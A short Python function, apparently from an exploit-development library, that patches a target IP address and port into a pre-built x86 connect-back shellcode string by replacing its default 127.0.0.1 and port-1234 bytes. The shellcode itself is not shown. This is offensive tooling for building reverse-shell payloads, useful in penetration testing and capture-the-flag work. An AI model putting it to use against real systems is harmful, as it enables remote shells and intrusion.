
def connect(ip, port):
	import struct
	import socket
	ip = socket.inet_aton(ip)
	port = struct.pack("!H", port)
	family = struct.pack("<H", 2)
	return connect_shellcode.replace("\x68\x7f\x00\x00\x01", "\x68" + ip).replace("\x68\x02\x00\x04\xd2", "\x68" + family + port)

